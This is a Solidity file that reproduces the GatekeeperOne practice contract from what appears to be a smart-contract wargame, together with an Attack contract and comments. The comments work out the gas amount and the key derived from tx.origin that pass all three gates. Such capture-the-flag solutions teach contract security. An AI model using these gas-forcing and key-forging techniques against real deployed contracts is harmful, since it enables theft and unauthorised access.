// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
  }

  // _gateKey = 0x 1111 0000 0000 <<last 2 bytes of tx.origin>>
  // p.s. - 1111 can be replaced by any 2 bytes containing at least one non-zero byte
  modifier gateThree(bytes8 _gateKey) {
      // let tx.origin = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4 =>
      // _gateKey = 0x 1111 0000 0000 ddC4
      // uint(0000 ddc4) == uint(ddc4)
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      // uint(0000 ddc4) != uint(1111 0000 0000 ddC4)
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      // uint(0000 ddc4) == uint(ddc4)
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract Attack {
  // gas = 423 in Remix VM (Shanghai)
  function attack(GatekeeperOne _target, uint gas) public {
    _target.enter{gas: 8191 * 3 + gas}(getKey());
  }

  function getKey() public view returns(bytes8) {
    return bytes8(
      bytes.concat(
        bytes2(0x1111),
        bytes2(0x0000),
        bytes2(0x0000),
        bytes2(uint16(uint160(msg.sender)))
      )
    );
  } 
}
